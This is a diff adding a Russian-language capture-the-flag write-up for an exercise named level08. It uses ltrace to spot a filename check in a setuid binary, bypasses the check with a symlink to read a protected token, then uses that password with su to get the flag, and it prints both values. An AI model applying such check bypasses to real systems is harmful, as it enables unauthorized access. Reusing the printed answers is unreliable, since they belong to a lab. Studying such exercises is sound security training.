@@ -1,0 +1,45 @@
+В домашней директории пользователя level08 находяться следующие файлы:
+    1. Исполняемый файл 'level08'
+    2. Файл 'token'
+Оба файла принадлежат пользователю flag08
+
+- Попробуем запустить файл 'level08'
+
+`./level08`
+Результат:
+./level08 [file to read]
+
+- Попробуем посмотреть содержимое файла 'token'
+`cat token`
+Результат:
+cat: token: Permission denied
+
+- Хорошо, тогда попробуем с помощью файла 'level08' прочитать файл 'token'
+`./level08 token`
+Результат:
+You may not access 'token'
+
+- Попробуем посмотреть assembly код с параметром token, будем использовать утилиту ltrace (можно gdb или другую удобную для вас утилиту или другую доступную)
+`ltrace ./level08 token`
+Результат:
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                            = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)        = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+Отсюда видно, что как только на вход программа получает параметр 'token', она выводит сообщение "You may not access 'token'"
+
+- Попробуем обойти данную проверку создав symbolic link на файл 'token'
+`ln -s ~/token /tmp/temp`
+`./level08 /tmp/temp`
+Результат:
+quif5eloekouj29ke0vouxean
+
+Подозреваю, что это то, что нам нужно, попробуем
+`su flag08`
+`quif5eloekouj29ke0vouxean`
+`getflag`
+Результат:
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
